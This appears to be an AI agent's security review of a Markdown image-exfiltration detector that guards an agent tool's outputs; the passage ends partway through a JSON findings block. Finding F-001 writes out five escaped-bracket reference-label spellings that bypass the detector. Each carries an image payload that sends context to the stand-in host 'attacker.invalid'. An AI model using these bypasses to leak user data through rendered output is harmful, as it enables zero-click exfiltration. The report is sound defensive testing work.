STATUS: DONE_WITH_CONCERNS

# T82 — independent verification of T81's two repairs (T78#F-001, T78#F-002)

## Scope

Bounded exactly as dispatched: the two repairs T81 made, and nothing else. A recorded scope
decision (`RESIDUALS.md`, «Правило, действующее с этого момента») closes this surface to further
rounds, with one exception — a blocker reproduced at a public boundary. I did not open a general
review of the module. One finding below fires that exception; everything else I noticed is
classified documentation-grade and belongs in `RESIDUALS.md`, not in a task.

Read first, in order: `.metaproject/index.md`, `RESIDUALS.md`, `T78-review.md` F-001/F-002,
`T81-spec.md`, `T81-implementation.md`. Then `src/security/detect/exfil.ts` (the label machinery at
`:520-635`, `:640-915`, `:1274-1510`), `src/security/detect/exfil.test.ts:1528-1675`,
`src/security/detect/index.ts`, `src/security/redact.ts`, `src/mcp/dispatch.ts`. All three reviewer
probes (`T78-perf.ts`, `T78-dup.ts`, `T78-boundary.ts`) were run by me before I formed a view.

I wrote none of the code, tests or prior reviews under examination.

## Summary by severity

| Severity | Count | Ids |
|---|---|---|
| blocker | 1 | T82#F-001 |
| major | 0 | — |
| minor | 3 | T82#F-002, T82#F-003, T82#F-004 |
| info | 1 | T82#F-005 |

**The two repairs are both confirmed.** The blocker is a *third*, pre-existing bypass in the same
file that neither T78 nor T81 was asked to look at, found while verifying the very fact T81's cost
proof is built on. It is blocking and reproduced at all four public boundaries, so by the scope
decision's own single exception it may not be filed as a residual.

## One row per item in the dispatch

| # | Item | Verdict | Evidence |
|---|---|---|---|
| 1 | **The cost property** — total label work Θ(input size); no document-written quantity changes the asymptotic cost | **CONFIRMED** | Part 1 (`!` gate) verified by reading both call sites: inline pass passes `false` (`:1385`), reference pass passes `isImage` (`:1452`), and `readBracketConstructs` short-circuits at `:887`. Part 2 (`]` fact) verified **from the pattern**, not the prose: `REFERENCE_DEF` (`:647`) captures `[^\]]+`; fuzz over 237 186 generated keys found 0 containing `]` before or after `normaliseLabel`. Disjointness re-derived independently (below) and found correct, with a tighter bound than the file states. Part 3 (budget) verified empirically: 22 shapes × 4 sizes, `overOneSecond: []`; 6 dials swept at **constant** 262 144 bytes, total spread ≤ 36.1 ms |
| 1a | Can two candidate spans be made to overlap, or a "bracket-free" span made to carry a bracket? | **No, and the concession is correctly located** | With `maxOpenBrackets = 0` I could not construct an overlap: a span passing `countInRange(index.closes,…) > 0` and `countInRange(opens,…) > 0` carries neither bracket, so the `[` opening it is the last `[` before the `]` closing it (`![![a]` rejects the outer span at exactly this test — verified). The only lever is defining a key containing `[`, which raises `maxOpenBrackets`; that is precisely what part 3 exists for |
| 1b | Any shape whose cost grows faster than its size? | **None found** | `T82-cost.ts ladder`: 22 shapes, exponents 0.73–1.44 except one artifact (T82#F-005). `T82-cost.ts sweep`: at fixed 262 144 bytes, definition-label length 3.3→6.6 ms, `[`-in-key 4.4→19.1 ms, definition count 2.2→4.9 ms, `![` opens 11.3→47.4 ms, closes 40.2→54.7 ms, opens×key-brackets 2.9→30.2 ms. Every dial moves cost by a bounded factor, none by an order |
| 2 | **Duplicate definition handling** — six spellings closed at four boundaries | **CONFIRMED** | `T78-dup.ts` re-run: `leakingCount: 0`, rows report 2/2/2/2/2/3 findings, control `c1SingleDef` unchanged at 1. My own `T82-dup.ts` (29 shapes) closes the six plus 11 spellings T78 did not list |
| 2a | Reversed order (attacker's definition second) | **CONFIRMED closed** | `r1…r6` in `T82-dup.log`: 2–3 findings each, attacker host absent at all four boundaries. Pinned by `attackerSecond` in `exfil.test.ts:1547` |
| 2b | Is the stronger form right, or does it flag enough benign content to be worse than the bet? | **Right** | Over-approximation costs exactly one extra masked URL per accidental duplicate. Benign corpus **unchanged**: `T53-corpus` Part B is byte-identical to T81's run (16 files / 62 findings / 7 flagged); the only diff lines are the whole-repository Part A header. Controls `c4DupBenignBoth`/`c5DistinctLabels` show a duplicated benign pair costs the same 2 findings as two distinct benign labels |
| 3 | **Nothing else moved** — 17 matrices byte-identical, 2 moved for stated reasons | **CONFIRMED, six-way** | I re-ran all 19 probes myself. 17 hashes equal T81's table character for character (now T66/T72/T77/T78/T81/**T82**). `T78-md` → `4a9034bc39…`, byte-identical to T81's after-log; its diff against the before-log is exactly the three rows claimed and `bypasses: []` |
| 3a | The `T53-corpus` explanation — a previous round named the wrong vector | **Correct this time** | Diff of T81's own before/after `T53-corpus` logs touches only `filesScanned`, `totalFindings`, `filesWithFindings`, `byPolicy`, `elapsedMs`. I enumerated every `T81-*` file in the raw dir through `detectExfil`: exactly three carry findings, all copies of the dup probe's own output, 3 findings each — matching the +1 file / +3 findings delta exactly. Named by enumeration, not narrative, as T78#F-003 demanded |
| AC5 | No field-name or spelling bypass; URL secret masked; public link not a network send | **PARTIAL** | URL secret masked in query and path form; `[docs](https://example.org/guide)` and its reference form produce 0 findings; the same secret is caught under `apiKey`, `zzz_random_field` and `"A P I   K E Y"` — no field-name bypass. **But** five reference-label spellings bypass entirely (T82#F-001) |
| RED | Each repair pinned by a test that fails without the change | **CONFIRMED** | I reconstructed the pre-repair behaviour in an isolated copy (three hunks reverted) and ran the three T81 tests there: all 3 fail — `wsInflatedBangRun_withLongDef=52 004.5 ms`, `balancedNest_withLongDef=9 665.7 ms`, the budget test at `elapsed<500ms:false`, and the duplicate test on the attacker host still present |

## Findings

### T82#F-001 — blocker — a backslash-escaped `]` in a reference label makes the definition invisible to the floor, and five spellings reach all four public boundaries with `redaction.state: "none"`

- **file / line / symbol**: `src/security/detect/exfil.ts:647` (`REFERENCE_DEF`), consumed at
  `:1305-1321` (the definition table loop) and gated at `:1439` (`while (refs.size > 0 && …)`).
- **problem**: `REFERENCE_DEF = /^[ \t]*\[([^\]]+)\]:…/gm`. The capture is `[^\]]+`, so the pattern
  cannot match a definition line whose label contains a `]` **at all** — not even a backslash-escaped
  one. CommonMark: a link label *"ends with the first right bracket `]` that is not backslash-escaped"*,
  so `[foo\]]: https://attacker.invalid/p` **is** a definition and `![foo\]]` **is** a use of it.
  The floor never builds a table entry, `refs.size` is 0, the reference pass at `:1439` does not run,
  and the document produces **zero findings**.
  This is the same structural fact T81's cost proof leans on, seen from the other side: "no key can
  ever contain `]`" is true of the *table*, and it is true because the scanner cannot see such
  definitions. The proof is sound; the completeness claim it sits next to is not.
- **impact**: measured on the shipped detector at the four public boundaries. Five spellings —
  shortcut `![foo\]]`, short `![x\]]`, full `![alt][foo\]]`, collapsed `![foo\]][]`, and two escapes
  `![a\]b\]c]` — each with `marked` emitting `<img src="https://attacker.invalid/p?ctx=CTX">`, while
  `dispatchCallTool`, `prepareOutputForPersistence`, `validateOutputForTransport` and
  `redactToolOutput` all carry `attacker.invalid` and report `redaction.state: "none"`. Zero-click,
  mandatory floor, attacker-chosen payload. Defence in depth does not cover it: with a
  secret-shaped value (`?token=sk-live-…`) the secrets floor masks the token but the **attacker host
  and the rest of the URL survive**, so the fetch still fires; with an ordinary parameter
  (`?ctx=CONTEXTLEAK`) the whole URL survives with `state: "none"`. A non-empty allowlist changes
  nothing (`escapedCloseAllowlistOn`). It is **not** a T81 regression — the same `[^\]]+` capture is
  present at HEAD (`0bc6418`), and T81 did not touch the pattern — but it is live on this tree.
- **reproduction**: `bun …/T82-escape.ts` →
  `bypasses: [s01EscapedClose, s02EscapedCloseShort, s03EscapedCloseFull, s04EscapedCloseCollapsed,
  s05TwoEscapedCloses]`, each row `detectorFindings: 0`, `mcpState: "none"`,
  `rendererFetches: ["https://attacker.invalid/p?ctx=CTX"]` and all four boundary flags true
  (raw: `T82-escape.log`). Also reached independently as `e1EscapedCloseInLabel` /
  `e2EscapedCloseDup` in `T82-dup.log`. The control `s00Baseline` (`![a]` + `[a]: URL`) is closed at
  1 finding, so the defect is specific to the escape.
- **suggested_fix**: this is a *definition-site* gap, so the repair belongs in `REFERENCE_DEF`, not
  in `readLabel`. Extend the capture to admit escaped closers — `\[((?:[^\]\\]|\\.)+)\]:` — and
  decide the label's text the way `normaliseLabel`'s callers will compare it. Two consequences must
  be handled together or the cost proof weakens: (a) once a key can contain `]`, `readLabel`'s
  `countInRange(index.closes, start, end) > 0` rejection at `:769` stops being a *necessary*
  condition and must become a derived threshold like the `[` one (max `]` any key carries, normally
  0), which keeps the disjointness argument in the ordinary case and hands the pathological case to
  the existing work budget — the mechanism is already there; (b) the header comment at `:707-717`
  must be rewritten, because "NO key can ever contain `]`, whatever an attacker writes" would no
  longer be the reason the spans are disjoint. If the escape is instead judged out of budget for
  phase 1, the honest alternative is to flag every reference **definition** in a document that
  contains `\]` inside a bracket run — over-approximation in the direction this floor may move.
- **class_scope**:
  - sites: `src/security/detect/exfil.ts:647` (`REFERENCE_DEF`, the only definition-site pattern);
    `src/security/detect/exfil.ts:769` (the `]` rejection that becomes unsound if the capture is
    widened); `src/security/detect/exfil.ts:707-717` (the header comment asserting the structural
    fact); `src/security/detect/exfil.ts:529-531` (the *use*-side decision not to honour backslash
    escapes, which is correct in its own direction and is what makes the two sides disagree);
    `docs/requirements/keryx-agent-first-core/policies.md:28` (the *«перечень полный, не пример»*
    completeness claim over the reference spellings, which this falsifies again).
  - enumeration_method: every CommonMark label-syntax feature that can change the bytes between `[`
    and `:` was enumerated from the spec's link-label rules and driven through both `detectExfil`
    and `marked`: backslash-escaped `]`, backslash-escaped `[`, backslash-escaped backslash,
    numeric character reference `&#93;`, named entity `&amp;`, multi-line label, destination on the
    following line, indentation, title, and the two Unicode case-mapping edges (`İ`, Final_Sigma) —
    18 cases in `T82-escape.ts`. Exactly one feature diverges: the backslash-escaped `]`, in all
    five of its reachable use spellings. Escaped `[` (`s06`), escaped backslash (`s07`), both entity
    forms (`s08`, `s09`), multi-line (`s10`), next-line destination (`s11`) and both Unicode edges
    (`s17`, `s18`) are all closed at 1 finding.

### T82#F-002 — minor — the duplicate regression test pins two of the four named public boundaries; the other two are closed only by probe

- **file / line / symbol**: `src/security/detect/exfil.test.ts:1535-1583` (`T81#F-002`).
- **problem**: the test asserts at the detector, through `applyRedaction`, through
  `prepareOutputForPersistence` and through `validateOutputForTransport`. The dispatch's four public
  boundaries are the **MCP tool dispatch**, the persistence materializer, the transport validator and
  the **tool-output seam**; `dispatchCallTool` and `redactToolOutput` are not named in the test.
- **impact**: both are demonstrably closed today (`T82-dup.log`, all 29 rows), and both funnel
  through the same redaction the test does exercise, so this is a durability gap and not a hole. It
  matters only because F-002's whole point was that a boundary can report `state:"redacted"` while
  still carrying the host — the two boundaries whose *state* field carried that lie are the two the
  test does not read.
- **reproduction**: read the test; compare its four assertion sites with the four boundary names in
  `T81-implementation.md` Part 2.
- **suggested_fix**: add `dispatchCallTool` and `redactToolOutput` rows to the existing loop, or
  state in the test's header that those two are covered by `structural-redaction.test.ts` and
  `persistence-sinks.test.ts` and name the case that covers them.
- **class_scope**: sites: `src/security/detect/exfil.test.ts:1535-1583`. Enumeration method: the
  four boundary entry points named in the dispatch were each searched for in the T81 tests.

### T82#F-003 — minor — `normaliseLabel` lowercases where CommonMark case-folds, and the two differ on Greek sigma

- **file / line / symbol**: `src/security/detect/exfil.ts:656-658` (`normaliseLabel`).
- **problem**: CommonMark matches link labels after *Unicode case folding*, which is
  context-insensitive (`Σ` and `ς` both fold to `σ`). `String.prototype.toLowerCase` is
  context-**sensitive**: `"ΟΣ".toLowerCase()` is `"ος"` (final sigma) while a case-folding renderer
  produces `"οσ"`. So `![οσ]` against `[ΟΣ]: URL` resolves under a folding renderer and does not
  resolve here.
- **impact**: not reproduced with a fetching renderer. `marked` — the renderer this floor is
  defended against, per the module header — uses `toLowerCase` too and agrees with the detector on
  every sigma spelling I drove (`s13`–`s16`, `u3`, `u4`). The residue is text-only: in
  `u4FinalSigmaRev` the attacker URL survives all four boundaries as plain text with no renderer
  fetching it. Reachable only against a strictly conformant folding renderer, which is not the
  measured threat model.
- **reproduction**: `T82-escape.log` rows `s13SigmaUseMedial` (0 findings, no `<img>`),
  `s14SigmaUseFinal` (1 finding); `T82-dup.log` row `u4FinalSigmaRev`
  (`textResidue`). Code points confirmed: `"ΟΣ".toLowerCase()` → `U+03BF U+03C2`,
  `"Σ".toLowerCase()` → `U+03C3`.
- **suggested_fix**: none under this dispatch. If a later round widens the renderer set beyond
  `marked`, `toLocaleLowerCase`-free case folding is the change, and it must be applied on both
  sides at once — a normalisation applied to one side only is a bypass, which this file already
  records at `:654`.
- **class_scope**: sites: `src/security/detect/exfil.ts:656-658`, applied at `:1307` (definition
  side) and `:780` (use side). Enumeration method: an exhaustive sweep of the BMP comparing
  `normalise(c).length` against the non-whitespace count of `c` (min delta 0, max delta 1), plus the
  three context-sensitive lowercase cases JS implements.

### T82#F-004 — minor — the inline-link sensitivity keyword list misses six ordinary secret-bearing parameter names

- **file / line / symbol**: `src/security/detect/exfil.ts`, `isSensitiveDestination` (reached from
  `:1403`).
- **problem**: `[click](https://h.invalid/q?<key>=SUPERSECRETVALUE)` is flagged for `token`,
  `api_key`, `apikey`, `secret`, `password`, `access_token` and released for `session`, `sessionid`,
  `pwd`, `auth`, `key`, `sig`.
- **impact**: bounded and not zero-click. A link requires a click, and the *image* path is
  deny-by-default for any external host regardless of parameter name (verified: `![a](…?session=X)`
  → 1 finding). So this widens a click-gated surface only.
- **reproduction**: 16-key sweep, `[["token",1],…,["session",0],["sessionid",0],["pwd",0],
  ["auth",0],["key",0],["sig",0]]`; `urlSecretLink` row in `T82-ac5.log`.
- **suggested_fix**: none under this dispatch — it is a keyword-list completeness question on a
  click-gated surface and is exactly the shape the scope decision closes.
- **class_scope**: sites: `src/security/detect/exfil.ts` `isSensitiveDestination`. Enumeration
  method: 16 parameter names drawn from the OWASP session/credential vocabulary driven through
  `detectExfil` in both link and image form.

### T82#F-005 — info — one row in my own ladder reports exponent 5.73 and is an artifact, recorded so a later round does not read it as superlinearity

- **file / line / symbol**: `.metaproject/flows/…/artifacts/T82-cost.ts`, shape
  `manyDefsThenBangRun`.
- **problem**: the builder caps its definition block at 4 000 entries, so across the four ladder
  points the byte count moves 588 893 → 700 893 (×1.19) while the `![` run moves ×8. The exponent is
  computed against **bytes**, so it reads 5.73.
- **impact**: none on the verdict. Cost moves 7.6 → 20.6 ms, i.e. linear in the dial that actually
  changed. Every one of the four points is three orders of magnitude under the budget.
- **reproduction**: `T82-cost-ladder.log`, `superLinear: ["manyDefsThenBangRun"]`.
- **suggested_fix**: none; the probe is a review artifact, not shipped code.

## Residual classification

The scope decision admits exactly one exception to "document, do not re-open": a **blocker
reproduced at a public boundary**.

| Finding | Class | Where it belongs |
|---|---|---|
| T82#F-001 | **blocking-and-reproduced** — `marked` fetches, all four boundaries carry the host, `state: "none"` | **Fires the exception.** It may not be filed in `RESIDUALS.md`. It needs a task, or an explicit user decision to accept a known zero-click bypass in the mandatory floor |
| T82#F-002 | documentation-grade | `RESIDUALS.md`, "Детектор автозагрузки" — a test-durability gap, no behaviour is open |
| T82#F-003 | documentation-grade | `RESIDUALS.md`. Not reproduced with a fetching renderer; conditional on a renderer set this phase does not defend against |
| T82#F-004 | documentation-grade | `RESIDUALS.md`. Click-gated surface, image path unaffected |
| T82#F-005 | documentation-grade | Probe artifact; recorded here only |

I did **not** re-open T78#F-003, F-004 or F-005, and I did not re-litigate anything in T78's PASS
table. The residual list stays trustworthy: four of my five findings are documentation-grade by the
decision's own criterion, and I say so rather than inflating them.

## Ruling on the three disclosed items

### (a) The two rejected suggestions — was the simpler design available?

**No. Both counterexamples are correct, verified by execution rather than accepted.**

1. *"`toLowerCase` can lengthen a string"* — `"İ"` (U+0130) is one code unit; `"İ".toLowerCase()` is
   two (U+0069 U+0307). An exhaustive BMP sweep gives `normalise(c).length − nonWhitespaceCount(c)`
   a range of exactly `[0, 1]`. So T78's suggestion (b) — an **exact**-length `Set` lookup computed
   from prefix arrays — is unsound in the **release** direction: the computed length is a lower
   bound, and a span whose true normalised length equals a key's would be excluded. This is not
   hypothetical here: `s17SigmaDottedIUse` / `s18DottedIDef` are live vectors that `marked` fetches
   and the floor currently flags, and an exact-length filter would have released them. The
   implementer was right to refuse, and right that the `]`/`[` conditions buy the same asymptotics
   with a soundness argument that does not depend on a case-mapping table.
   *The kept filter is separately sound*: because the delta is never negative, `nonWhitespace >
   maxLength ⇒ cannot match` holds for every BMP input.
2. *"a locale rule makes per-position lowercasing wrong"* — `"ΟΣ".toLowerCase()` is `"ος"`
   (U+03C2, Final_Sigma) but `"Σ".toLowerCase()` is `"σ"` (U+03C3), and a whole-document lowercase
   disagrees with a per-span one at a span boundary: `"xΟΣy".toLowerCase().slice(1,3)` is `"οσ"`
   while `"xΟΣy".slice(1,3).toLowerCase()` is `"ος"`. A pre-lowercased rolling-hash stream would
   therefore not agree with `normaliseLabel(span)`, and the disagreement is exactly a released
   label. Correct refusal.

Both refusals stand. The simpler design was **not** available, and rejecting it was the right call
rather than a convenient one. (Note the second fact is also the mechanism behind T82#F-003 — the
implementer identified the divergence precisely and used it only for the narrower argument.)

### (b) `LABEL_WORK_FACTOR = 8` — is a constant acceptable here?

**Yes, and naming it plainly is the right treatment.** It is not a bound on a length, so the class
of defect that recurred three times on this path (a bound chosen by the implementer, defeated by
writing one more of whatever was bounded) cannot recur through it: whatever the constant, total work
stays Θ(input). Its failure direction is more findings, and the allowlist still applies —
verified: a budget-exhausting document flags **both** definitions including the unused one, and the
allowlisted twin returns 0 findings (`T82-budget.log`).

One thing I can add that makes the constant less arbitrary than the file states. Because a span
passing the filters carries at most `maxOpenBrackets` opening brackets, span *i* cannot extend past
the `(maxOpenBrackets + 1)`-th open after it, so the total candidate span length is bounded by
`(maxOpenBrackets + 1) × content.length` **without any budget at all**. The budget therefore only
binds when a document defines a key containing **8 or more** `[` — nothing in the benign corpus
does, and I reached it only with a 60 000-`[` key. That is a stronger statement than "8× is roughly
four times the most an honest document can spend", and it is worth carrying into the comment if the
file is touched again.

### (c) The megabyte / wall-clock residual — does it belong in the list?

**Yes, and the number should be measured rather than inherited.** T81 reports 564.6 ms as the worst
single boundary reading anywhere in its round. Searching my own shape set I found a **worse** one:
`resolvingBangUses` (`![k]` repeated, every use resolving) at **1 048 618 bytes costs 676.8 ms at
`redactToolOutput`** — the worst reading I found anywhere, and still comfortably under a second.
Extrapolating the same shape's own ladder (134 → 286.6 → 676.8 ms across 256 KB → 1 MB), one second
falls at roughly **1.5 MB**, not the ~2 MB T81 estimated.

The residual is real, correctly scoped and correctly disowned: a hard wall-clock guarantee needs a
size cap at the boundaries, and that is `dispatch.ts` / `guard.ts` territory, not this file's. It
should be written into `RESIDUALS.md` with the boundary owner named and with the measured crossing
point, so the next round does not re-derive it. It is **not** blocking: linear cost on an
attacker-sized input is a capacity question, not a bypass, and the floor is not the only thing that
must read a multi-megabyte tool output.

## Confirmed clean areas

- **The `!` gate move is behaviour-preserving.** 17 of 19 prior matrices are byte-identical to five
  prior rounds; the two that moved moved for the two stated reasons and nothing else.
- **The budget's failure direction.** Exhaustion flags every definition in the table, including one
  no use resolves, and the allowlist still releases an allowlisted definition under exhaustion.
- **No shape exceeds one second at any boundary up to a megabyte.** 9 shapes × 3 sizes × 4
  boundaries; worst 676.8 ms (stated above). Detector-only worst: 409 ms at 1 048 587 bytes.
- **T78's own three shapes.** `shapesOverOneSecond: []`, `superLinearShapes: []`, exponents
  1.10 / 0.94 / 0.92 against T78's 1.79 / 2.11 / 1.78.
- **The four boundaries on T78's tuned payload**: 20.7 / 25.6 / 17.7 / 16.6 ms against 1 948–2 278 ms.
- **AC5's other two halves.** A URL secret is masked in query and path position; a public Markdown
  link (inline and reference form) is not treated as a network send; the same secret is caught under
  three unrelated field names, including one with interior spaces.
- **Types and lint.** `tsc --noEmit` clean; `bunx eslint` on `exfil.ts`, `exfil.test.ts`,
  `detect/index.ts`, `redact.ts`, `mcp/dispatch.ts` → 0 problems.
- **Focused suites.** `bun test src/security/detect/exfil.test.ts src/security/output-validation.test.ts
  src/mcp/structural-redaction.test.ts src/security/persistence-sinks.test.ts` → **112 pass / 0 fail /
  1 168 expect()**, exactly the counts T81 reported.

## Evidence

Every command run from `/Users/Goodea/goodea/keryx` on branch `codex/agent-first-core` (HEAD
`0bc6418`). No git state change, no flow state change, no dependency change, no network, no model
call. Synthetic and reserved hosts only (`attacker.invalid`, `ok.example.org`, `example.org`,
`h.invalid`, `cdn.example.org`). Production, test and documentation files were not modified —
`src/security/detect/exfil.ts` hashes `466f7392…` and `exfil.test.ts` hashes `bf1c7819…` at the end
of this review, unchanged throughout.

### Probes I wrote

| Path | SHA-256 |
|---|---|
| `…/artifacts/T82-dup.ts` | `d63664918a0b19b1732566701fed65b0742cfafa00074e6a0e639bb811f088b5` |
| `…/artifacts/T82-escape.ts` | `6eb8e17deced291eba5495955e07326decba13059c24addf3e0f6dddecdd4d6a` |
| `…/artifacts/T82-cost.ts` | `f06baebb47a0a995ba9d2eada495e7993e85a888c5d708f93eae14763b7d0d59` |
| `…/artifacts/T82-boundary.ts` | `09be51f91aa66e718e8d43e277c81edbd8aa6d3a71666cc17e6c1f303680f623` |

### Raw logs

All under `/Users/Goodea/goodea/keryx/.metaproject/data/gdctx/raw/`.

| Log | SHA-256 | What it shows |
|---|---|---|
| `T82-T78-dup.log` | `46c556d7bce3711e4653a1b749c880f44f05e945864760bdda02095cb95989ff` | reviewer probe, `leakingCount: 0` |
| `T82-T78-perf.log` | `24db519b45d1c981d84fb668ebc80c8be2ed12f70cad89949783703b7fdec3e7` | reviewer probe, `shapesOverOneSecond: []`, `superLinearShapes: []` |
| `T82-T78-boundary.log` | `ec0a929624b6c5baee0866eead0e7a5dcad36c7f0f05026fb6092c215ac46c1c` | reviewer probe, `boundariesOverOneSecond: []` |
| `T82-dup.log` | `a5089a62eab05134281fd6cff47452b6442afd6a78151593ec21fe154f2e160f` | 29 duplicate shapes; `zeroClickLeaks: [e1EscapedCloseInLabel, e2EscapedCloseDup]` |
| `T82-escape.log` | `2f86456d015816ee1837b6aa736bd789e752c4c3906238d2f5144ca19fe81ae3` | 18 label spellings; `bypasses: [s01…s05]` — **T82#F-001** |
| `T82-cost-ladder.log` | `54a74e4741bef6a9f895f292a6bf0a729bea47b2f6bcdb7c3721e81aa3642b76` | 22 shapes × 4 sizes; `overOneSecond: []` |
| `T82-cost-sweep.log` | `64c2c96304c6b0bd32eb496663fbf703410b768d10c9eb925c2c0c187f2bb3c3` | 6 dials at constant 262 144 bytes |
| `T82-boundary.log` | `41cfd736e8087927fbb186531a18d29c12c5613110f7fe56d3e6a1c5a6316770` | 9 shapes × 3 sizes × 4 boundaries, one shape per process |
| `T82-budget.log` | `62595fb89f4c0e09df41085b649f843ea71e52be77b3ae1be77e2d2c236fcdde` | budget exhaustion flags, allowlist still releases |
| `T82-ac5.log` | `90c6aba82e26ade235d63c3c5c1d4ae398d749f56bdfcef9d2eb0aa7a6c630ca` | AC5 spot check across the boundaries |
| `T82-matrices.txt` | `261b77255d2c2b38d282e6249b3c77463be002a95df37b3bf6df5fe39f8e82b8` | my own 19-probe hash table |
| `T82-<probe>.log` × 19 | see `T82-matrices.txt` | each prior matrix, re-run by me |

### Matrix hashes — 17 identical, six-way agreement (T66/T72/T77/T78/T81/T82)

`T42-exfil-attack 0646c508…`, `T24-recheck2-exfil 8c9bfec0…`, `T42-charrefs 698d8899…`,
`T53-extract ad20286b…`, `T53-resolve 06037910…`, `T53-base 3416d62e…`, `T53-boundary 398012ce…`,
`T42-boundary 7030455d…`, `T24-recheck2-boundary 83839962…`, `T52-base a04404db…`,
`T46-surfaces d8348c99…`, `T72-md 15866b62…`, `T72-gates e4d04c18…`, `T72-srcset 2e96f8d7…`,
`T72-doc 69df9705…`, `T77-doc bee36307…`, `T78-corpus 3fb901e3…` — every one equal to T81's table.

Moved: `T78-md 4a9034bc390368cf3befe81de78517dcbb3e837a3bae21eacb0a8679070bb837`, byte-identical to
`T81-after-T78-md.log`. `T53-corpus c2987734…` (T81 recorded `a0a89d9d…`) — differs only in the
whole-repository Part A header, by the same mechanism, because I wrote 54 more files between the
runs; the benign Part B rows are unchanged.

### Temporary fixtures

Two `mkdtemp` directories were used and removed: one holding `git show HEAD:…` copies of three
source files, to establish that `REFERENCE_DEF`'s capture is identical at HEAD; one holding a copy of
`src/` with three hunks of T81's change reverted, to obtain the RED evidence. Neither touched the
working tree. Both removed.

## Routing audit

- `graph_used`: **no** — *not-relevant*. Every file was named in the dispatch; there was no
  navigation or blast-radius question for gdgraph to answer.
- `wiki_used`: **no** — *not-relevant*. The normative source for this task is the flow's own
  artifacts (`T78-review.md`, `T81-spec.md`, `T81-implementation.md`) plus CommonMark, not the
  project wiki.
- `ctx_used`: **yes** — `keryx ctx rg` for all four code searches, and the routing hook refused
  `grep`, `cat`, `tail`, `git log`, `git show` and `git diff` and was honoured each time.
- `raw_rg_used`: **no** raw `rg`/`grep` ran.
- **Tooling disclosure, per the dispatch.** `keryx ctx rg`'s summary silently dropped rows in both
  of my first two searches — it reported `Matches: 15` while listing 4, and `Matches: 38` while
  listing 4. I read the raw logs it wrote (`.metaproject/data/gdctx/raw/…_rg.log`) to recover the
  complete match lists, and used the `# keryx:raw` escape with a stated reason for every direct
  command thereafter. This is the eighth and ninth recorded instance of the defect already filed as
  flow 236 / T5-T6 in `RESIDUALS.md`. `bun` was invoked directly for every probe and suite rather
  than through `keryx ctx run`, on the same ground eight prior rounds recorded: the per-shape timing
  rows and per-case verdicts **are** the evidence, and compaction elides them.

```json keryx:findings
[
  {
    "id": "F-001",
    "global_id": "T82#F-001",
    "reviewer": "T82-independent-verifier",
    "severity": "blocker",
    "file": "src/security/detect/exfil.ts",
    "line": 647,
    "symbol": "REFERENCE_DEF",
    "problem": "REFERENCE_DEF captures the reference label as `[^\\]]+`, so a definition whose label contains a backslash-escaped `]` — which CommonMark permits and `marked` resolves — is never captured. `refs` stays empty, the reference pass at :1439 does not run, and the document yields zero findings.",
    "impact": "Zero-click exfiltration bypass in the mandatory floor. Five spellings (shortcut, short, full, collapsed, two-escape) each have `marked` emit <img src=\"https://attacker.invalid/p?ctx=CTX\"> while dispatchCallTool, prepareOutputForPersistence, validateOutputForTransport and redactToolOutput all carry the attacker host and report redaction.state \"none\". A non-empty allowlist does not help; the secrets floor masks only a secret-shaped parameter and leaves the attacker host and the fetch intact. Pre-existing (the same capture is at HEAD 0bc6418) but live on this tree, and it falsifies the completeness claim at policies.md:28 for the reference forms.",
    "suggested_fix": "Widen the definition capture to admit escaped closers, e.g. `\\[((?:[^\\]\\\\]|\\\\.)+)\\]:`, and in the same change convert readLabel's `]` rejection at :769 from a necessary condition into a derived threshold (max `]` any key carries, normally 0), exactly as the `[` condition already works, so the disjointness argument survives in the ordinary case and the pathological case falls to the existing work budget. Rewrite the header comment at :707-717, which asserts the now-weakened fact. If out of budget for phase 1, flag every reference definition in a document containing `\\]` inside a bracket run.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T82-escape.ts -> bypasses: [s01EscapedClose, s02EscapedCloseShort, s03EscapedCloseFull, s04EscapedCloseCollapsed, s05TwoEscapedCloses], each detectorFindings 0, mcpState \"none\", all four boundary flags true; control s00Baseline closed at 1 finding. Raw: .metaproject/data/gdctx/raw/T82-escape.log (sha256 2f86456d015816ee1837b6aa736bd789e752c4c3906238d2f5144ca19fe81ae3). Reached independently as e1EscapedCloseInLabel / e2EscapedCloseDup in T82-dup.log.",
    "confidence": "high",
    "blocking_merge": true,
    "class_scope": {
      "sites": [
        "src/security/detect/exfil.ts:647 (REFERENCE_DEF, the only definition-site pattern)",
        "src/security/detect/exfil.ts:769 (the `]` rejection that becomes unsound if the capture widens)",
        "src/security/detect/exfil.ts:707-717 (header comment asserting the structural fact)",
        "src/security/detect/exfil.ts:529-531 (the use-side decision not to honour backslash escapes)",
        "docs/requirements/keryx-agent-first-core/policies.md:28 (the completeness claim over the reference spellings)"
      ],
      "enumeration_method": "Every CommonMark link-label syntax feature that can change the bytes between `[` and `:` was enumerated from the spec's link-label rules and driven through both detectExfil and marked: escaped `]`, escaped `[`, escaped backslash, numeric character reference, named entity, multi-line label, next-line destination, indentation, title, and the two Unicode case-mapping edges (U+0130, Final_Sigma) — 18 cases in T82-escape.ts. Exactly one feature diverges, in all five of its reachable use spellings; the other nine are closed at 1 finding each."
    },
    "verification": {
      "verdict": "confirmed",
      "method": "execution",
      "evidence": "T82-escape.ts and T82-dup.ts each reach the class independently at all four public boundaries; git show HEAD:src/security/detect/exfil.ts confirms the identical `[^\\]]+` capture at HEAD, so it is pre-existing rather than a T81 regression.",
      "verifier": "T82-independent-verifier"
    }
  },
  {
    "id": "F-002",
    "global_id": "T82#F-002",
    "reviewer": "T82-independent-verifier",
    "severity": "minor",
    "file": "src/security/detect/exfil.test.ts",
    "line": 1535,
    "symbol": "T81#F-002 regression test",
    "problem": "The duplicate-definition regression test asserts at the detector, applyRedaction, prepareOutputForPersistence and validateOutputForTransport. Two of the four public boundaries named in the dispatch — dispatchCallTool and redactToolOutput — are not read by it.",
    "impact": "Durability gap, not an open hole: both are closed today across all 29 shapes in T82-dup.log, and both funnel through the same redaction the test exercises. It matters only because F-002's distinguishing feature was a boundary reporting state \"redacted\" while carrying the host, and the two boundaries whose state field carried that report are the two the test does not read.",
    "suggested_fix": "Add dispatchCallTool and redactToolOutput rows to the existing loop, or state in the test header which existing suite covers them and name the case.",
    "evidence": "src/security/detect/exfil.test.ts:1549-1572 read against the four boundary names in T81-implementation.md Part 2; all four verified closed by bun .../T82-dup.ts (raw: .metaproject/data/gdctx/raw/T82-dup.log).",
    "confidence": "high",
    "blocking_merge": false
  },
  {
    "id": "F-003",
    "global_id": "T82#F-003",
    "reviewer": "T82-independent-verifier",
    "severity": "minor",
    "file": "src/security/detect/exfil.ts",
    "line": 656,
    "symbol": "normaliseLabel",
